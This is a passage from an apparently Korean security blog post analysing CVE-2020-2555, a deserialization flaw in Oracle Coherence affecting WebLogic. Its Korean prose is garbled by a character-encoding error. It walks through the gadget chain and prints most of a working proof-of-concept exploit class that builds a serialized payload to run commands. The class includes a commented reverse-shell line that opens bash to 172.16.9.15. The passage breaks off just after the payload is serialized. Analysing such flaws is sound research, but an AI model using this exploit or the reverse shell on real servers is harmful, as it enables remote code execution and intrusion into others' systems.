&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;ValueExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aExtractor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExtractors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Called extract()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë”°ë¼ì„œ ì´ë¥¼ ì²´ì´ë‹í•˜ì—¬ ì•„ë˜ì™€ ê°™ì´ ì›í•˜ëŠ” ì½”ë“œë¥¼ ì‹¤í–‰(RCE)í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Runtime.getRuntime().exec(â€œcalcâ€)&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Runtime.class.getRuntime()&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractor1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;getMethod&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;getRuntime&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// get invoke() to execute exec()&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractor2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;invoke&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// invoke(&quot;exec&quot;,&quot;calc&quot;)&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractor3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;calc&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractors&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extractor1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extractor2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extractor3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;nc&quot;&gt;ChainedExtractor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chainedExtractor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ChainedExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extractors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ìœ„ ë‹¨ê³„ë¥¼ ìˆœì„œëŒ€ë¡œ ë‚˜ì—´í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
    &lt;ol&gt;
      &lt;li&gt;BadAttributeValueExpException.readObject()&lt;/li&gt;
      &lt;li&gt;com.tangosol.util.filter.LimitFilter.toString() - extract() í˜¸ì¶œ(chainedExtractor Reflection ë° limitFilter ê°ì²´ í• ë‹¹)&lt;/li&gt;
      &lt;li&gt;com.tangosol.util.extractor.ChainedExtractor.extract() - Loop(3)&lt;/li&gt;
      &lt;li&gt;com.tangosol.util.extractor.ReflectionExtractor.extract() - [getMethod(â€œgetRuntimeâ€), invoke(), exec(â€œcalcâ€)]&lt;/li&gt;
      &lt;li&gt;Method.invoke()
â€¦&lt;/li&gt;
      &lt;li&gt;Runtime.getRuntime.exec()&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;expanded-attack-surface-oracle-business-intelligence&quot;&gt;Expanded attack surface: Oracle Business Intelligence&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;ë˜í•œ ì•ì„œ ì–¸ê¸‰í–ˆë“°ì´, í•´ë‹¹ ì·¨ì•½ì ì€ Coherence libraryì—ì„œ ë°œìƒí•˜ê¸° ë•Œë¬¸ì— í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ëŠ” ì›¹ ì–´í”Œë¦¬ì¼€ì´ì…˜ ì„œë²„(WebLogic, Glassfish, Hibernate, Spring ë“±) ë° ë‚´ì¥ëœ ì–´í”Œë¦¬ì¼€ì´ì…˜ì—ì„œë„ ë°œìƒí•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ê³µê²© ê°€ëŠ¥í•œ ë²”ìœ„ê°€ í™•ì¥ ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-2555 PoC&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.supeream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// com.supeream from https://github.com/5up3rc/weblogic_cmd/&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// com.tangosol.util.extractor.ChainedExtractor from coherence.jar&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.supeream.serial.Serializables&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.supeream.weblogic.T3ProtocolOperation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.tangosol.util.extractor.ChainedExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.tangosol.util.extractor.ReflectionExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.tangosol.util.filter.LimitFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.management.BadAttributeValueExpException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.FileInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.FileOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.ObjectInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.ObjectOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.lang.reflect.Field&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/*
 * author:Y4er.com
 *
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.tangosol.util.extractor.ChainedExtractor.extract()
 *                  com.tangosol.util.extractor.ReflectionExtractor.extract()
 *                      Method.invoke()
 *                      ...
 *                      Runtime.getRuntime.exec()
 */&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CVE_2020_2555&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// Runtime.class.getRuntime()&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractor1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;getMethod&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;getRuntime&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}&lt;/span&gt;

        &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// get invoke() to execute exec()&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractor2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;invoke&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}&lt;/span&gt;

        &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// invoke(&quot;exec&quot;,&quot;calc&quot;)&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractor3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;galculator&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// new Object[]{new String[]{&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.9.15/1004 0&amp;gt;&amp;amp;1&quot;}}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;nc&quot;&gt;ReflectionExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractors&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;extractor1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;extractor2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;extractor3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;nc&quot;&gt;ChainedExtractor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chainedExtractor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ChainedExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extractors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;LimitFilter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limitFilter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LimitFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;//m_comparator&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Field&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m_comparator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limitFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;m_comparator&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;m_comparator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;m_comparator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limitFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chainedExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;//m_oAnchorTop&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Field&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m_oAnchorTop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limitFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;m_oAnchorTop&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;m_oAnchorTop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;m_oAnchorTop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limitFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// BadAttributeValueExpException toString()&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// This only works in JDK 8u76 and WITHOUT a security manager&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;BadAttributeValueExpException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;badAttributeValueExpException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BadAttributeValueExpException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Field&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;badAttributeValueExpException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;val&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;field&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;field&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;badAttributeValueExpException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limitFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// serialize&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Serializables&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;badAttributeValueExpException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

